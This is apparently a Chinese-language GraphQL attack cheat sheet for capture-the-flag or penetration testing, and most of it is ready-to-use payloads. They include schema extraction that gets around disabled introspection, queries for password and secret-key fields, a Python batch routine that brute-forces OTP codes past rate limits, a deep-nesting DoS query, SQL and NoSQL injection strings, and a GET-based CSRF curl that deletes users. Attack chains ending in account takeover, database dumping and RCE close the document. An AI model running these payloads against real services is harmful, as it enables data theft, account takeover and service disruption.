# GraphQL 攻击实战

## 环境判断

```
信号:
- /graphql, /api/graphql, /gql, /query
- POST body 含 "query" 或 "mutation"
- 响应含 "data" + "errors" 结构
- 响应头: Content-Type: application/json
- 报错含 "__typename" "Cannot query field" "GraphQLError"
```

## 1. Introspection 拖 Schema

```graphql
# 基础 introspection（如果未禁用）
{
  __schema {
    queryType { name fields { name type { name kind } } }
    mutationType { name fields { name type { name kind } args { name } } }
    types { name kind fields { name type { name kind ofType { name } } } }
  }
}

# 绕过 introspection 禁用 (分段查询)
{ __typename }
{ __schema { types { name } } }       # 先拿 type 名称
{ __type(name: "User") { fields { name type { name } } } }  # 再逐 type 拿字段

# 用别名绕过速率限制/重复字段限制
query {
  a: __type(name: "User") { fields { name } }
  b: __type(name: "Admin") { fields { name } }
  c: __type(name: "Flag") { fields { name } }
}
```

## 2. 字段级授权绕过

```python
# 拖到 schema 后，直接查不该看到的字段
# 假设 schema 暴露了 User { id, email, password, role, isAdmin }

MUTATIONS = [
    # 查管理员
    'query { users { id email role isAdmin } }',
    # 查所有用户
    'query { allUsers { id email password } }',
    # 查 flag
    'query { flag }',
    'query { system { flag } }',
    'query { config { secretKey } }',
    # mutation 滥用
    'mutation { deleteUser(id: 1) { success } }',
    'mutation { promoteUser(id: 123, role: "admin") { success } }',
    # 跨类型关联
    'query { user(id: 1) { posts { comments { author { email } } } } }',
]
```

## 3. Batch Query 绕过 Rate Limit

```python
# 单请求发多条 query，绕过基于请求数的速率限制
import requests, json

def batch_attack(endpoint: str, queries: list[str]):
    """将多条 query 打包到同一个 POST body"""
    # 方式 1: 数组
    body = [{"query": q} for q in queries]
    r = requests.post(endpoint, json=body)
    return r.json()

    # 方式 2: 别名 (aliases) — 同一 query 重复执行
    aliases = {}
    for i, q in enumerate(queries):
        aliases[f"q{i}"] = q
    # → query q0 { ... } query q1 { ... } ...

# 实战: Bypass OTP bruteforce protection
otp_queries = [
    f'mutation {{ verifyOtp(code: "{c:06d}") {{ success }} }}'
    for c in range(0, 1000000, 1000)
]
# 每 1000 条打包一次 send
```

## 4. Alias 滥用

```graphql
# 同一 mutation 用不同别名多次执行
mutation {
    a: createInviteCode { code }
    b: createInviteCode { code }
    c: createInviteCode { code }
}
# → 一次性生成 3 个邀请码，可能绕过每日限制

# 同一 query 获取不同用户
query {
    u1: user(id: 1) { email }
    u2: user(id: 2) { email }
    u3: user(id: 3) { email }
}
# → 绕过 "每次查询只允许一个用户" 的限制
```

## 5. Fragment/Inline Fragment 越权

```graphql
# 利用 inline fragment 试探隐藏类型
query {
    node(id: "xxx") {
        ... on Admin { secretKey }
        ... on User { email }
        ... on Flag { value }
    }
}

# Union type 利用
query {
    search(term: "a") {
        ... on User { email }
        ... on Admin { password }   # Admin 可能继承 User
    }
}
```

## 6. 深度递归 DoS (Cost Limit)

```graphql
# 构造深度嵌套查询耗尽服务端资源
query {
    users {
        posts {
            comments {
                author {
                    posts {
                        comments {
                            author {
                                posts {
                                    comments { author { id } }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

## 7. 注入类

```python
# GraphQL 的底层通常是 SQL/NoSQL/ORM
# 参数位置可能仍然存在注入

# SQLi via GraphQL argument
# query { user(id: "1 OR 1=1") { email } }

# NoSQLi via GraphQL filter
# query { users(filter: {email: {"$regex": ".*"}}) { email password } }

# SSTI via GraphQL (如果后端用模板渲染错误信息)
# query { user(id: "{{7*7}}") { email } }
```

## 8. Subscription (WebSocket) 攻击

```graphql
# GraphQL Subscription 走 WebSocket
subscription {
    userCreated { id email password }
}
# 实时收到新用户数据 — 可能包含不该发的字段

# 探测: 用 wsrepl 连接 /graphql (ws:// 模式)
# 发送: {"type":"connection_init","payload":{}}
# 收到: {"type":"connection_ack"}
# 发送: {"id":"1","type":"start","payload":{"query":"subscription { flagChanged { flag } }"}}
```

## 9. Persisted Queries 滥用

```graphql
# 如果服务端注册了持久化查询 (persisted queries)
# 攻击者可能:
# 1. 猜测/枚举已知 query hash
# 2. 发送已注册的 query 但附带额外字段

# 探测
POST /graphql HTTP/1.1
{"extensions":{"persistedQuery":{"version":1,"sha256Hash":"<hash>"}}}

# 如果服务端说 "PersistedQueryNotFound" →
# 可以发送同样的 hash + 完整 query 一起注册
```

## 10. Field Suggestions 信息泄露

```bash
# Apollo Server 默认开启 field suggestions
# query { user(id: 1) { doesnotexist } }
# → "Cannot query field 'doesnotexist' on type 'User'. Did you mean 'email' or 'password'?"
# → 利用这个泄露所有字段名

# 自动提取脚本:
curl -s 'https://target.com/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ users { doesnotexist } }"}' | jq '.errors[].message'
```

## 11. GET 方法 CSRF

```bash
# 如果 GraphQL 接受 GET:
curl "https://target.com/graphql?query=mutation+%7B+deleteAllUsers+%7B+success+%7D+%7D"
# → 可在 <img> 标签中触发，绕过 CORS/CSRF token
```

---

## 工具链

```bash
# Graphw00f — 指纹
python3 graphw00f.py -t https://target.com/graphql

# Clairvoyance — 绕过 introspection 禁用提取 schema
python3 clairvoyance.py -o schema.json https://target.com/graphql

# GraphQL Cop (Burp) — 安全扫描
# InQL (Burp) — IDE + 攻击
# CrackQL — 批量爆破/注入
python3 crackql.py -t https://target.com/graphql -q queries.graphql -w wordlist.txt

# BatchQL — schema 检查 + 批量 query
# https://batchql.com
```

## Evidence

记录: introspection/schema JSON、field suggestion 泄露的字段名、subscription 连接和消息、batch/alias 绕过请求/响应对

## 12. 攻击链

```
GraphQL Introspection → 完整 Schema → 发现 admin{flag} → 直接查询
GraphQL Alias 批量 → 绕过 1 query/min rate limit → 批量数据导出
GraphQL Batch → 绕过 OTP verify → 暴力破解 → Account Takeover
GraphQL field suggestion → 逐字段泄露 → 拼出完整数据模型
GraphQL → NoSQLi in filter → $regex 盲注 → 拖库
GraphQL Subscription → WebSocket → 实时监听 flag 变化
GraphQL GET → CSRF → mutation 执行 → 删号/转账
GraphQL + sqlmap → 底层 SQLi → 读文件 → RCE
```
